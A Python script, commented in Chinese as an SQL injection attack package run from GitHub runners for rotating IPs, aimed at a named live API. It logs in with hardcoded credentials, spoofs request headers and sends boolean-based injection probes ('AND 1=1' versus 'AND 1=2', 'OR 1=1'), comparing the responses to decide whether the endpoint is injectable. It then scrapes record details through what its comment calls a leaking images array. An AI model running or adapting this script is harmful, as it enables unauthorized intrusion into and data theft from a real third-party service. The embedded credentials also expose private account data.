# -*- coding: utf-8 -*-
"""SQLi 注入攻击包: 跑在 GitHub runner(每 6 分钟新 IP)"""

import urllib.request, urllib.parse, json, time, sys, ssl

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
out = []


def log(s):
    print(s, flush=True)
    out.append(str(s))


def req(method, path, data=None, headers=None, timeout=12):
    h = {
        "User-Agent": UA,
        "Origin": "https://loiship.com",
        "Referer": "https://loiship.com/",
    }
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(
        "https://api.moegoat.com" + path, data=body, headers=h, method=method
    )
    ctx = ssl.create_default_context()
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:200]
    except Exception as e:
        return "EXC", type(e).__name__


shard = int(sys.argv[1]) if len(sys.argv) > 1 else 1

# 登录
st, body = req(
    "POST", "/api/user/login", {"email": "3124323585@qq.com", "password": "9876543210."}
)
tok = ""
if st == 200:
    tok = (json.loads(body).get("access_token") or "").replace("bearer ", "")
H = {"Authorization": "Bearer " + tok}
log("login: %s tok:%s" % (st, tok[:10] or "NONE"))

# 注入测试矩阵 (精简: 4 个核心, 给 vip/sqli2/3 留窗口)
tests = [
    ("GET", "/api/lois?page=1%20AND%201=1", "page-and1", "auth"),
    ("GET", "/api/lois?page=1%20AND%201=2", "page-and2", "auth"),
    ("GET", "/api/user/loi/download_v6/6422%20OR%201=1", "dl-or", "auth"),
    ("GET", "/api/lois?page=1", "page-normal", "auth"),
]

res = []
for method, path, name, auth in tests:
    hdrs = H if auth == "auth" else None
    st, b = req(method, path, headers=hdrs)
    res.append({"t": name, "s": st, "b": b[:220]})
    log("%s: %s %s" % (name, st, b[:90].replace("\n", " ")))
    time.sleep(0.4)


# 判定: and1 vs and2 差异
def get_res(name):
    for r in res:
        if r["t"] == name:
            return r


a1, a2 = get_res("page-and1"), get_res("page-and2")
if a1 and a2:
    diff = a1["b"] != a2["b"]
    log(
        "### SQLi 判定(page and1 vs and2): %s ###"
        % ("DIFF=可注入!!!" if diff else "相同(不可注入)")
    )
    if diff:
        log("and1: %s" % a1["b"][:150])
        log("and2: %s" % a2["b"][:150])

# 完整详情抓取 (images 数组泄露)
for lid in [6422, 6421, 6420, 6419, 6418, 6417, 6416, 6415, 6414, 6413, 6412, 6411]:
    st, b = req("GET", "/api/lois/%d" % lid, headers=H)
    with open("fulldetail.jsonl", "a", encoding="utf-8") as f:
        f.write(json.dumps({"id": lid, "detail": b[:2500]}, ensure_ascii=False) + "\n")
    log("fulldetail %d: %s" % (lid, st))
    time.sleep(0.5)


with open("sqli_%d.jsonl" % shard, "w", encoding="utf-8") as f:
    for r in res:
        f.write(json.dumps(r, ensure_ascii=False) + "\n")
with open("sqli_%d.txt" % shard, "w", encoding="utf-8") as f:
    f.write("\n".join(out))
log("sqli shard%d done" % shard)
